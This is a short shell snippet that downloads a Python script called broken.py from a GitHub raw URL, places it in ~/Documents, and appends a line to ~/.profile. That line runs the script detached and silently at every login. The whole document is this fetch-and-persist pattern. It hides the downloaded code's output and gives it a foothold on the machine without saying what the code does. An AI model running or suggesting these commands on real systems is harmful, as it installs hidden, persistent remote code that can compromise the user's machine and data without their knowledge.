curl -O https://raw.githubusercontent.com/SoftPankek/Broken/refs/heads/main/broken.py
mv broken.py ~/Documents/broken.py
echo 'setsid python3 ~/Documents/broken.py >/dev/null 2>&1 &' >> ~/.profile
exit
